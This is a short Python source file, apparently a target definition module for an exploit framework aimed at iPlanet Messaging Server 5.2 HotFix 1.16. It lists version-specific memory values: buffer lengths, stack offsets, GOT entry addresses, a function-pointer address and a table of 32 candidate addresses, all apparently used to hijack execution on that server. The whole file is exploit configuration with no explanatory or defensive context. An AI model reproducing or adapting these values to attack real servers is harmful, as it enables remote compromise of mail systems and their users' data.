import iplanet

class iplanet_5_2hf1_16(iplanet.type3):
   def __init__(self):
      self.conn = 0

   version = 'iPlanet Messaging Server 5.2 HotFix 1.16 (built May 14 2003)'
   baseBufLen = 0x1bc
   l7Offset = -0x241cL
   l7Imta = 0x559510L
   l7ImtaResponse = 0x540be8L
   got = [0x5639dcL, 0x4ff860L, 0x4ff868L, 0x4ff870L]
   fp = 0x97e0d8L
   bigBufOffset = -0x26f8L
   socketOffset = -0x3d8L
   addrs = \
      [0x562F78L ,
       0x5B13DCL ,
       0x5D28C4L ,
       0x5F5B5CL ,
       0x6137E8L ,
       0x62F9DCL ,
       0x64C6ACL ,
       0x669264L ,
       0x685590L ,
       0x6A1ABCL ,
       0x6BD944L ,
       0x6DA46CL ,
       0x6F6BACL ,
       0x71366CL ,
       0x730340L ,
       0x74BDCCL ,
       0x768AECL ,
       0x784F0CL ,
       0x7A0C48L ,
       0x7BCAF8L ,
       0x7D96E0L ,
       0x7F63A4L ,
       0x824F7CL ,
       0x846608L ,
       0x868514L ,
       0x889FC8L ,
       0x8BAD68L ,
       0x8EB1C8L ,
       0x908038L ,
       0x924C50L ,
       0x942650L ,
       0x9611B4L ]
